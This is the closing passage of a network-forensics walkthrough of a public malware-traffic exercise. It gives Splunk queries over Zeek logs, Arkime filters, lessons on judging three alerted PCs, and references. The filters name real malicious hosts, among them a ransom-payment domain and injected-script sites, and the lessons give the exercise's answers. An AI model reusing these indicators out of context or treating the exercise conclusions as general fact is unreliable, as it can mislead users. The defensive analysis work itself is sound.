index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=192.168.0.0/16 | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h | eval first=strftime(first,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dhcp pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t client_addr assigned_addr mac host_name msg_types server_addr | sort t
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(host) as sites by id_orig_h user_agent | sort id_orig_h first
index=zeek sourcetype=zeek:dns pcap_case=<case> id_resp_p=53 | stats count by id_orig_h id_resp_h
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host | sort id_orig_h first
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer user_agent status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> user_agent="*MSIE 7.0*" | eval time=strftime(ts,"%H:%M:%S.%3N") | table time id_resp_h host uri referrer status_code resp_mime_types response_body_len | sort time
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | stats count, values(tx_hosts) as servers, values(seen_bytes) as size by md5
index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first, max(ts) as last, count by server_name | eval first=strftime(first,"%H:%M:%S.%3N"), last=strftime(last,"%H:%M:%S.%3N") | sort first
index=zeek sourcetype=zeek:ssl pcap_case=<case> id_orig_h=<pc> server_name="<sni>" | sort ts | delta ts as gap | eval time=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table time id_orig_p id_resp_h gap
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> id_resp_p=443 | eval end=ts+duration | where end>=<epoch1> AND end<<epoch2> | table ts end id_orig_p id_resp_h resp_bytes | addcoltotals resp_bytes
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> | stats min(ts) as first_seen, count, sum(resp_bytes) as resp_bytes by id_resp_h, id_resp_p | where first_seen>=<epoch> | eval first_seen=strftime(first_seen,"%H:%M:%S.%3N") | sort first_seen
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count, max(seen_bytes) as max_bytes by mime_type | sort - count
```

**Arkime** (remember: `http.uri` = host + path)

```text
tags == <case> && ip.src == 192.168.122.132 && http.uri == "www.koeppl.com/"
tags == <case> && ip.src == 192.168.122.132 && http.uri == */officer/*
tags == <case> && ip.src == 192.168.122.132 && host.http == [bizsouls.com, estudiobarco.com.ar]
tags == <case> && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
tags == <case> && ip.src == 192.168.122.130 && http.uri == */counter/*
tags == <case> && ip.src == 192.168.122.130 && port.dst == 443
tags == <case> && ip.src == 192.168.122.52 && http.uri == [planetside.co.uk/media/system/js/mootools-core.js, planetside.co.uk/media/system/js/core.js]
tags == <case> && ip.src == 192.168.122.52 && host.http == st.domandvilma.com
tags == <case> && ip.src == 192.168.122.52 && host.http == planetside.co.uk
```

---

## Lessons { #lessons }

1. **Three alerts, three different answers.** An alert says "look here", not "infected". Decide per PC from what happened **after** the alert.
2. **Infected = something new runs.** PC A and B both show a **new User-Agent** (`MSIE 7.0`) that is not the browser. PC C never does.
3. **Proof of execution: decide the trace first, then look for it.** The cookies on PC A and PC C were made by the injected code; no server ever sent them.
4. **The Referer names the page, not the script, and not whether a person clicked.** Use the decoded code, the page staying open and the cookies.
5. **Size tells a lot.** A 26-byte reply cannot be an exploit kit; a 412 KB reply with no file type after a Flash file almost certainly is a payload.
6. **Labels lie, content does not.** `image/gif` + `.gif` names, but Zeek's `application/x-dosexec` says "program".
7. **Compare without decoding.** Identical encrypted bodies (Arkime Body MD5s) proved a C2 list on PC A.
8. **`stats min/max` hides the middle.** Spread events out with `delta` before linking times: the "webmail 6 s before the download" link on PC B was an automatic refresh.
9. **Know your tools' units.** An Arkime session is a TCP connection; the Arkime graph puts a session's bytes at its last packet; Arkime's `http.uri` includes the host.
10. **Not every method finds something.** The no-DNS subsearch found nothing; PC B showed nothing after the downloads. Those are results too.
11. **The user's own actions matter.** PC A's user opened the ransom page and typed its captcha — tell the response team before anyone pays.

## References { #references }

- [Sorting through the alerts — same Splunk-first method](socgholish-fake-chrome-update-wscript-c2.md) · [Phishing red herring to EK drive-by](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Zeek logs](../../network/zeek/index.md) · [files.log](../../network/zeek/files-log.md) · [conn.log](../../network/zeek/conn-log.md)
- Original exercise: [malware-traffic-analysis.net — 2016-01-07 Alerts on 3 different hosts](https://malware-traffic-analysis.net/2016/01/07/index.html) · [answers](https://www.malware-traffic-analysis.net/2016/01/07/page2.html)
